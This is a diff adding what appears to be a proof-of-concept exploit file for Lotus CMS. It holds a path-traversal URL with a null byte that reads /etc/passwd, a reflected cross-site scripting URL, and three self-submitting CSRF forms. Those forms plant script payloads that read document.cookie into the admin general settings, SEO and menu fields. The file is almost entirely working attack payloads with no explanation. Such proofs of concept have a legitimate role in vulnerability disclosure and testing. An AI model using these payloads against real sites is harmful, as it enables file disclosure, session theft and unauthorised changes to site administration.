@@ -1,0 +1,28 @@
+
+http://www.example.com/index.php?page=./../../../../../etc/passwd%00
+
+<form action="http://www.example.com/index.php?system=GeneralSettings&page=edit" method="post" name="main">
+<input type="hidden" name="title" value='Lotus CMS"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
+
+<form action="http://www.example.com/index.php?system=SEO&page=edit" method="post" name="main">
+<input type="hidden" name="seokeywords" value="LotusCMS">
+<input type="hidden" name="seodescription" value='description"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+http://www.example.com/index.php?page=%00"><script>alert(document.cookie)</script>
+
+<form action="http://www.example.com/index.php?system=Modules&page=admin&active=Menu&req=save&id=3" method="post" name="main">
+<input type="hidden" name="title" value='lotus"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="external" value="http://www.example.com">
+</form>
+<script>
+document.main.submit();
+</script>
